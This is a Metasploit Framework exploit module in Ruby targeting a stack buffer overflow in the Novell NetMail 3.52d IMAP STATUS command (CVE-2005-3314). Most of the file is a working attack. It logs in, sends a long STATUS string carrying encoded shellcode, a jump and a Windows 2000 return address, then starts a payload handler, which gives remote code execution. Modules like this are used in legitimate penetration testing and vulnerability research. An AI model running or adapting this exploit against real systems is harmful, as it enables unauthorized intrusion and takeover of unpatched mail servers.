##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Imap

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell NetMail <= 3.52d IMAP STATUS Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Novell's Netmail 3.52 IMAP STATUS
				verb. By sending an overly long string, an attacker can overwrite the
				buffer and control program execution.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2005-3314' ],
					[ 'OSVDB', '20956' ],
					[ 'BID', '15491' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x0a\x0d\x20",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows 2000 SP0-SP4 English',   { 'Ret' => 0x75022ac4 }],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 18 2005'))

	end

	def exploit
		sploit =  "a002 STATUS " + rand_text_english(1602) + payload.encoded
		sploit << "\xeb\x06" + rand_text_english(2) + [target.ret].pack('V')
		sploit <<  [0xe8, -485].pack('CV') + rand_text_english(150) + " inbox"

		info = connect_login

		if (info == true)
			print_status("Trying target #{target.name}...")
			sock.put(sploit + "\r\n")
		else
			print_status("Not falling through with exploit")
		end

		handler
		disconnect
	end
end
